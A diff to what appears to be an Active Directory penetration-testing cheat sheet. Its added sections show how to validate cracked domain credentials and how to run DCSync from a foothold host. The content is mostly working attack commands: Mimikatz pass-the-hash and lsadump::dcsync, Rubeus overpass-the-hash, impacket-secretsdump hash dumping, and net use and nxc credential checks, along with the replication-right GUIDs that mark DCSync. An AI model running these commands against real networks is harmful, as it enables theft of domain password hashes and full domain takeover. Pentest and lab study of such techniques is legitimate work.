@@ -58,6 +58,19 @@ Get-DomainUser {{TARGET_USER}} -Properties samaccountname,serviceprincipalname,m
 > Feeding an AES hash to 13100 just fails — always check `msds-supportedencryptiontypes` (or Rubeus
 > `/stats`) first. Clock skew (`KRB_AP_ERR_SKEW`) → `sudo ntpdate {{DC_IP}}`.
 
+### Validate the cracked password
+
+> Confirm the recovered creds are live (and the account can reach a host) by mapping a share.
+> Explicit `/user:` + password = password auth, no pre-existing ticket needed. By **hostname** it
+> uses Kerberos; by **IP** it falls back to NTLM.
+
+```cmd
+net use \\{{TARGET_IP}}\c$ /user:{{DOMAIN}}\{{USERNAME}} {{PASSWORD}}
+net use \\{{TARGET_IP}}\c$ /delete            :: clean up the mapping
+```
+
+> Cross-check from Linux: `nxc smb {{TARGET_IP}} -u {{USERNAME}} -p {{PASSWORD}}` (a `[+]` = valid).
+
 <details><summary>Manual / LOLBIN method (no tools — educational)</summary>
 
 ```powershell
@@ -170,6 +183,16 @@ net group "{{GROUP_NAME}}" {{USERNAME}} /del /domain
 Get-ObjectAcl "DC={{DOMAIN_NB}},DC=LOCAL" -ResolveGUIDs | ? { $_.ObjectAceType -match 'Replication-Get' } | ? {$_.SecurityIdentifier -match "{{SID}}"} | select ObjectDN,ActiveDirectoryRights,ObjectAceType
 ```
 
+> **`-ResolveGUIDs` matters:** without it, `ObjectAceType` shows the raw extended-right GUID instead
+> of the name — the `-match 'Replication-Get'` filter then silently matches nothing. Add the flag, or
+> learn the DCSync tell — these GUIDs on the **domain object** = DCSync:
+>
+> | GUID | Right |
+> |---|---|
+> | `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` | DS-Replication-Get-Changes |
+> | `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` | DS-Replication-Get-Changes-All |
+> | `89e95b76-444d-4c62-991a-0facbeda640c` | DS-Replication-Get-Changes-In-Filtered-Set |
+
 ```bash
 # Linux — Impacket (dump one user or all)
 impacket-secretsdump -just-dc-user {{TARGET_USER}} {{DOMAIN}}/{{USERNAME}}:"{{PASSWORD}}"@{{DC_IP}}
@@ -183,6 +206,34 @@ lsadump::dcsync /user:{{DOMAIN_NB}}\{{TARGET_USER}}
 ```
 
 > Target `krbtgt` (→ Golden Ticket) and `Administrator` (→ PtH as DA). `runas /netonly /user:{{DOMAIN_NB}}\{{USERNAME}} powershell` to run tooling in the account's context.
+
+### DCSync from a foothold host (pivot-free, hash-only)
+
+> When **Kali can't route to the DC** (internal subnet) and you don't want to set up a SOCKS pivot,
+> run the DCSync **on a host you already have** that *can* reach the DC — e.g. the box you RDP'd into.
+> `lsadump::dcsync` only needs the **replication rights** (which `{{USERNAME}}` has), **not** local
+> admin — so pick the injection method by what you hold:
+
+```
+:: have the PASSWORD → no PtH needed, just launch tooling in the account's context
+runas /netonly /user:{{DOMAIN_NB}}\{{USERNAME}} powershell.exe
+
+:: have the HASH + you ARE local admin → Mimikatz pass-the-hash (patches LSASS → needs admin)
+privilege::debug
+sekurlsa::pth /user:{{USERNAME}} /domain:{{DOMAIN}} /ntlm:<NT_HASH> /run:powershell.exe
+
+:: have the HASH, NOT local admin → Rubeus overpass-the-hash (no LSASS touch, no admin)
+Rubeus.exe asktgt /user:{{USERNAME}} /domain:{{DOMAIN}} /rc4:<NT_HASH> /ptt
+```
+
+Then, in the resulting `{{USERNAME}}`-context session, DCSync as normal:
+
+```
+lsadump::dcsync /domain:{{DOMAIN}} /user:{{TARGET_USER}}
+```
+
+> **First check:** if the host you're on *is* the DC, skip DCSync entirely — dump NTDS locally
+> (Shadow Copy / `ntdsutil`, below). DCSync is for reaching the DC *from another host*.
 
 ---
 
